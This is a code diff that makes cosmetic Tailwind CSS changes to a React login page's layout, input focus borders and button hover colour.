@@ -38,7 +38,7 @@ function MainPage() {
   };
 
   return (
-    <div className="h-[100vh] w-[100vw] sm:h-[80vh] bg-[#f2f4f7] sm:flex sm:flex-row">
+    <div className="h-[100vh] w-[100vw] sm:h-[80%] bg-[#f2f4f7] sm:flex sm:flex-row">
       <div className="h-[40%] p-4 sm:h-full sm:flex-1 sm:flex sm:justify-end">
         <div className="flex flex-col items-center p-4 gap-y-32 sm:gap-y-0 sm:justify-center h-full">
           <div className="language text-[19px] flex justify-center w-full">
@@ -69,18 +69,18 @@ function MainPage() {
               value={username}
               onChange={(e) => setUserName(e.target.value)}
               placeholder="Mobile number or email"
-              className="border-[0.4px] p-[16px] text-black sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:outline-[1px] focus:outline-blue-500"
+              className="border-[0.4px] p-[16px] text-black sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:outline-[1px] focus:border-[2px] focus:border-blue-600 outline-none"
             />
             <input
               type="password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="Password"
-              className="border-[1px] text-black p-[16px] sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl"
+              className="border-[1px] text-black p-[16px] sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:border-[2px] focus:border-blue-600 outline-none"
             />
             {error && <p className="text-red-500">{error}</p>} {/* Display error message */}
             <button
-              className="bg-[#0866ff] border-gray-600 rounded-3xl sm:rounded-xl p-[10px] sm:p-[15px] border-0 outline-none text-[19px]"
+              className="bg-[#0866ff] border-gray-600 rounded-3xl sm:rounded-xl p-[10px] sm:p-[15px] border-0 outline-none text-[19px] hover:bg-blue-700"
               onClick={handleLogin}
             >
               Log in
